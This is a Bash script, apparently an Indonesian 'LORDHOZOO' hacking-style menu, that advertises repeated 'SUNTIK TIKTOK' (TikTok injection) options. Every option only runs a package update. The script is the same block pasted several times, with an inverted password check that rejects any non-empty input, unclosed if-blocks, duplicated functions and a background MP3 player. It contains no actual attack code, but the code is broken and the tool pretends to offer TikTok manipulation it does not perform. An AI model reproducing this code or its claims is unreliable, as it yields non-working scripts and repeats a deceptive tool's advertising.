echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt  update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt  update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
  apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt  update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt  update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt  update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi


if [ "$updt" -eq 21 ]; then
    # Add your code here for option 21
    apt update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 22 ]; then
    # Add your code here for option 22
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 23 ]; then
    # Add your code here for option 23
    apt update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update -y
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update -y
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 24 ]; then
    # Add your code here for option 24
    apt  update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
